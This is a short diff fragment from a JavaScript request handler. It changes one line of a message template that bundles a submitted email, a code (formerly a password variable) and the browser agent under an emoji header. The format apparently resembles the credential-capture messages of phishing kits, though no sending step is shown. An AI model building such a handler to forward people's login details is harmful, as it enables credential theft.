@@ -14,7 +14,7 @@ module.exports = async function handler(req, res) {
 📩  Coaches
 
 📧 Email: ${email}
-🔑 Code: ${pass}
+🔑 Code: ${code}
 🖥️ Agent: ${agent}
     `;
 
